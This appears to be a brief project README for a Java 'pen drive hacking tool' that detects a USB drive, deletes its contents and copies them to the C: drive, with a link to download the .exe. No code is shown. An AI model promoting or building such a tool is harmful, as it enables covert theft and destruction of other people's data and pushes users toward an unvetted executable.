# Pendrive-Hacking-Tool-using-Java
Its a Pen Drive hacking tools which is written in Java. In java I have used the File Handling concept. In this tool first of all the software will detect the pendrive and then all the contents of a pendrive will be deleted and it will be stored to a particular location in C: Drive
As soon as you execute the file it will delete all the contents from the pendrive and will be copied to your local machine (C:Drive)

You can Download the .exe file <a href="https://drive.google.com/file/d/0B4ti6xW75GdlOWhiQjdCNk5XUzQ/view?usp=sharing">here</a>
